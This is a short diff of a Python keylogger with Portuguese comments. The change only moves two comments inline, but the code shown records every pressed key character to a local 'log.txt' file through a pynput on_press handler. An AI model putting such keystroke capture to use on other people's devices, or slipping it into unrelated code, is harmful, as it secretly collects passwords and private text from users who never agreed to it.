@@ -11,10 +11,8 @@ IGNORAR = {
     keyboard.Key.caps_lock,
     keyboard.Key.cmd
 }
-# Abre o arquivo 'log.txt' em modo append (adiciona sem sobrescrever).
-# encoding="utf-8" garante que caracteres acentuados sejam gravados corretamente.
-def on_press(key):
-    with open("log.txt", "a", encoding="utf-8") as f:
+def on_press(key):  # Abre o arquivo 'log.txt' em modo append (adiciona sem sobrescrever). 
+    with open("log.txt", "a", encoding="utf-8") as f: # encoding="utf-8" garante que caracteres acentuados sejam gravados corretamente.
         try:
             f.write(key.char)
         except AttributeError:
